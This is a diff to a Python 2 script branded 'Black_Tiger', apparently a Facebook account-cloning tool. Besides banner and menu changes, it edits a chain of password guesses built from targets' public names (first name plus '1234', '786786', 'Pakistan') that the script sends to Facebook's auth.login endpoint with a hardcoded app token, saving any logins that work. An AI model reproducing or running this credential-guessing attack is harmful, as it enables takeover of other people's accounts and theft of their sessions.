@@ -114,16 +114,51 @@ def phone():
 ##### LOGO #####
 logo = """
 
-\033[1;91m─────────█████
-
-\033[1;91m•───────────────────────────────────────────•
+\033[1;91m        
+\033[1;92m                  ,_> `.   ,';
+\033[1;93m              ,-`'      `'   '`'._
+\033[1;94m           ,,-) ---._   |   .---''`-),.
+\033[1;95m         ,'      `.  \  ;  /   _,'     `,
+\033[1;96m      ,--' ____       \   '  ,'    ___  `-,
+\033[1;97m     _>   /--. `-.              .-'.--\   \__
+\033[1;92m    '-,  (    `.  `.,`~ \~'-. ,' ,'    )    _\
+\033[1;93m    _<    \     \ ,'  ') )   `. /     /    <,.
+\033[1;94m ,-'   _,  \    ,'    ( /      `.    /        `-,
+\033[1;95m `-.,-'     `.,'       `         `.,'  `\    ,-'
+\033[1;96m  ,'       _  /   ,,,      ,,,     \     `-. `-._
+\033[1;97m /-,     ,'  ;   ' _ \    / _ `     ; `.     `(`-\
+\033[1;92m  /-,        ;    (o)      (o)      ;          `'`,
+\033[1;93m,~-'  ,-'    \     '        `      /     \      <_
+\033[1;94m/-. ,'        \                   /       \     ,-'
+\033[1;95m  '`,     ,'   `-/             \-' `.      `-. <
+\033[1;96m   /_    /      /   (_     _)   \    \          `,
+\033[1;97m     `-._;  ,' |  .::.`-.-' :..  |       `-.    _\
+\033[1;91m       _/       \  `:: ,^. :.:' / `.        \,-'
+\033[1;92m     '`.   ,-'  /`-..-'-.-`-..-'\            `-.
+\033[1;93m       >_ /     ;  (\/( ' )\/)  ;     `-.    _<
+\033[1;94m       ,-'      `.  \`-^^^-'/  ,'        \ _<
+\033[1;95m        `-,  ,'   `. `   ' ,'   `-.   <`'
+\033[1;96m          ')        `._.,,_.'        \ ,-'
+\033[1;97m           '._        '`'`'   \       <
+\033[1;91m            
+\033[1;92m•───────────────────────────────────────────•
 \033[1;97m•-----------------\033[1;37mBLACK_TIGER\033[1;97m-----------------•
- \033[1;95m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
+\033[1;91m•▅▅▅▅                                      ▅▅▅▅
+ 033[1;92m•▅▅▅▅▅▅      WELCOME BLACKTIGER       ▅▅▅▅▅▅
+\033[1;93m•▅▅▅▅▅▅▅▅▅    HEPING ZOON     ▅▅▅▅▅▅▅▅▅
+\033[1;94m•▅▅▅▅▅▅▅▅▅▅▅             ▅▅▅▅▅▅▅▅▅▅▅
+\033[1;95m•▅▅▅▅▅▅▅▅▅▅▅▅▅      ▅▅▅▅▅▅▅▅▅▅▅▅▅
+\033[1;96m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
 \033[1;41m\033[1;32m[🎭♠️\033[1;32mName: Black_Tiger ♣️🎭\033[1;32m]\033[1;0m
 \033[1;41m\033[1;32m[♠️🎭\033[1;32m☏ →+923037335114 🎭♣️\033[1;32m]\033[1;0m
 \033[1;41m\033[1;32m[🎭♠️\033[1;32mYT Channal:Time4 You ♣️🎭\033[1;32m]\033[1;0m
-\033[1;41m\033[1;32m[♠️🎭\033[1;32mFrom: Pakistan 🎭♣️\033[1;32m]\033[1;0m
-\033[1;95m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
+\033[1;41\033[1;32m[♠️🎭\033[1;32mFrom: Pakistan 🎭♣️\033[1;32m]\033[1;0m
+\033[1;96•▅▅▅▅                                      ▅▅▅▅
+ 033[1;95•▅▅▅▅▅▅      WELCOME BLACKTIGER       ▅▅▅▅▅▅
+\033[1;94•▅▅▅▅▅▅▅▅▅    HEPING ZOON     ▅▅▅▅▅▅▅▅▅
+\033[1;93•▅▅▅▅▅▅▅▅▅▅▅             ▅▅▅▅▅▅▅▅▅▅▅
+\033[1;92•▅▅▅▅▅▅▅▅▅▅▅▅▅      ▅▅▅▅▅▅▅▅▅▅▅▅▅
+\033[1;91m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
 \033[1;97m•-----------------\033[1;37mBLACK_TIGER\033[1;97m-----------------•
 """
 
@@ -224,7 +259,7 @@ def login1():
                 time.sleep(0.05)
 		print logo                
 		print "\033[1;97m•-----------------\033[1;36mBlack_Tiger\033[1;97m-----------------•"
-		print('\033[1;97m[+]\033[1;47m\033[1;36mLOGIN WITH FACEBOOK\x1b[1;97m \033[1;0m' )
+		print('\033[1;97m[+]\033[1;41m\033[1;36mLOGIN WITH FACEBOOK\x1b[1;97m \033[1;0m' )
 		print('	' )
 		id = raw_input('\033[1;92m[!] \x1b[1;93mNumber/Email\x1b[1;97m: \x1b[1;97m')
 		pwd = raw_input('\033[1;92m[+] \x1b[1;97mPassword\x1b[1;97m    : \x1b[1;97m')
@@ -308,13 +343,13 @@ def menu():
 	print "\033[1;31m🎭\033[1;95m ID\033[1;95m:\033[1;95m"+id+"\x1b[1;95m              "
 	time.sleep(0.05)
 	print "\033[1;93m•-----------------\033[1;34mBlack_Tiger\033[1;93m-----------------•"
-	print "\033[1;92m[🎭1]\033[1;41m\033[1;37mStart Hacking                             \033[1;0m"
+	print "\033[1;92m[🎭1]\033[1;41m\033[1;37mStart Hacking                    \033[1;0m"
 	time.sleep(0.05)
-	print "\033[1;92m[🎭2]\033[1;41m\033[1;37mID Not Found Problem Solve                     \033[1;0m"
+	print "\033[1;92m[🎭2]\033[1;41m\033[1;37mID Not Found Problem Solve       \033[1;0m"
 	time.sleep(0.05)
-	print "\033[1;92m[🎭3]\033[1;41m\033[1;37mRest/Update Black_Tiger                          \033[1;0m"
+	print "\033[1;92m[🎭3]\033[1;41m\033[1;37mRest/Update Black_Tiger          \033[1;0m"
 	time.sleep(0.05)
-	print "\033[1;92m[🎭0]\033[1;41m\033[1;37mExit                                      \033[1;0m"
+	print "\033[1;92m[🎭0]\033[1;41m\033[1;37mExit                             \033[1;0m"
 	time.sleep(0.05)
 	pilih()
 
@@ -407,7 +442,7 @@ def super():
 	time.sleep(0.05)
 	print "\033[1;92m[🎭2]\033[1;41m\033[1;97mClone From Public Id \033[1;0m"
 	time.sleep(0.05)
-	print "\033[1;93m[🎭0]\033[1;41m\033[1;97mBack                     \033[1;0m"
+	print "\033[1;93m[🎭0]\033[1;41m\033[1;97mBack              \033[1;0m"
 	time.sleep(0.05)
 	pilih_super()
 
@@ -467,7 +502,7 @@ def pilih_super():
 		try:													
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
-			pass1 = b['first_name'] + '123'+'1234'+'12345'+'123456'+'12'+'1'												
+			pass1 = b['first_name'] + '1234'												
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			q = json.load(data)												
 			if 'access_token' in q:
@@ -489,7 +524,7 @@ def pilih_super():
 				    cek.close()
 				    cekpoint.append(user+pass1)
                                 else:
-				    pass2 ='786786'+'000786'+'786000'					
+				    pass2 ='786786'					
                                     data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			            q = json.load(data)												
 			            if 'access_token' in q:	
@@ -511,7 +546,7 @@ def pilih_super():
 				               cek.close()
 				               cekpoint.append(user+pass2)								
 				           else:											
-					       pass3 = 'Pakistan'+'Pakistan1'+'Pakistan12'+'Pakistan786'				
+					       pass3 = 'Pakistan'				
 					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
 					       q = json.load(data)										
 					       if 'access_token' in q:	
@@ -533,7 +568,7 @@ def pilih_super():
 				                           cek.close()
 				                           cekpoint.append(user+pass3)									
 					               else:										
-						           pass4 = b['last_name'] +'786'+'123'+'1234'											
+						           pass4 = b['first_name'] +'123'											
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                   q = json.load(data)												
 			                                   if 'access_token' in q:		
@@ -555,7 +590,7 @@ def pilih_super():
 				                                       cek.close()
 				                                       cekpoint.append(user+pass4)					
 					                           else:									
-						                       pass5= b['first_name'] +'@12'+'@123'+'@1234'+'@12345'+'@123456'
+						                       pass5= b['first_name'] +'12345'
 						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
 						                       q = json.load(data)								
 						                       if 'access_token' in q:	
@@ -577,7 +612,7 @@ def pilih_super():
 				                                                   cek.close()
 				                                                   cekpoint.append(user+pass5)					
 						                               else:								
-							                           pass6 = b['first_name'] +'786'+'1122'+'khan'										
+							                           pass6 = b['first_name'] +'786'										
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                           q = json.load(data)												
 			                                                           if 'access_token' in q:	
@@ -599,7 +634,7 @@ def pilih_super():
 				                                                               cek.close()
 				                                                               cekpoint.append(user+pass6)	
 						                                           else:							
-								                               pass7 = b['last_name']+'1122'						
+								                               pass7 = b['first_name']+'1122'						
 								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
 								                               q = json.load(data)						
 								                               if 'access_token' in q:		
@@ -621,7 +656,7 @@ def pilih_super():
 				                                                                           cek.close()
 				                                                                           cekpoint.append(user+pass7)           					
 								                                       else:						
-										                           pass8 =b['first_name'] + '###'+'$$$'+'@.com'		
+										                           pass8 ='000786'	
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
 			                                                                                   if 'access_token' in q:		
@@ -643,7 +678,7 @@ def pilih_super():
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass8)   	
 										                                   else:					
-										                                       pass9 = b['first_name'] + 'jutt'				
+										                                       pass9 = b['first_name'] + 'Khan'				
 										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
 										                                       q = json.load(data)				
 										                                       if 'access_token' in q:		
@@ -677,20 +712,14 @@ def pilih_super():
 	print"\033[1;97m[+]\033[1;97mTotal \033[1;97mOK/\x1b[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
 	print "\033[1;97m«-----------------\033[1;37mBlack_Tiger\033[1;97m-----------------»"
 	print """
- \033[1;97m
-\033[1;97m ██████╗  ██████╗  █████╗     ██╗     ██╗   ██╗ ██████╗██╗  ██╗
-\033[1;97m██╔════╝ ██╔═══██╗██╔══██╗    ██║     ██║   ██║██╔════╝██║ ██╔╝
-\033[1;97m██║  ███╗██║   ██║╚█████╔╝    ██║     ██║   ██║██║     █████╔╝ 
-\033[1;97m██║   ██║██║   ██║██╔══██╗    ██║     ██║   ██║██║     ██╔═██╗ 
-\033[1;97m╚██████╔╝╚██████╔╝╚█████╔╝    ███████╗╚██████╔╝╚██████╗██║  ██╗
-\033[1;97m ╚═════╝  ╚═════╝  ╚════╝     ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝
-                                            
-\033[1;91m ██████╗ ██████╗  ██████╗ ██████╗ ███████╗██████╗ ██████╗ ███████╗ ██╗ ██╗██╗  ██╗
-\033[1;92m██╔═████╗╚════██╗██╔═████╗╚════██╗╚════██║╚════██╗╚════██╗██╔════╝███║███║██║  ██║
-\033[1;93m██║██╔██║ █████╔╝██║██╔██║ █████╔╝    ██╔╝ █████╔╝ █████╔╝███████╗╚██║╚██║███████║
-\033[1;94m████╔╝██║ ╚═══██╗████╔╝██║ ╚═══██╗   ██╔╝  ╚═══██╗ ╚═══██╗╚════██║ ██║ ██║╚════██║
-\033[1;95m╚██████╔╝██████╔╝╚██████╔╝██████╔╝   ██║  ██████╔╝██████╔╝███████║ ██║ ██║     ██║
-\033[1;96m ╚═════╝ ╚═════╝  ╚═════╝ ╚═════╝    ╚═╝  ╚═════╝ ╚═════╝ ╚══════╝ ╚═╝ ╚═╝     ╚═╝      
+\033[1;91m _______  __    _      ___  _______  __   __ 
+\033[1;92m|       ||  |  | |    |   ||       ||  | |  |
+\033[1;93m|    ___||   |_| |    |   ||   _   ||  |_|  |
+\033[1;94m|   |___ |       |    |   ||  | |  ||       |
+\033[1;95m|    ___||  _    | ___|   ||  |_|  ||_     _|
+\033[1;96m|   |___ | | |   ||       ||       |  |   |  
+\033[1;97m|_______||_|  |__||_______||_______|  |___|  
+
 """
 	print "\033[1;97m«-----------------\033[1;37mBlack_Tiger\033[1;97m-----------------»"
 	raw_input("\n\033[1;97m[+]\033[1;97mBack")
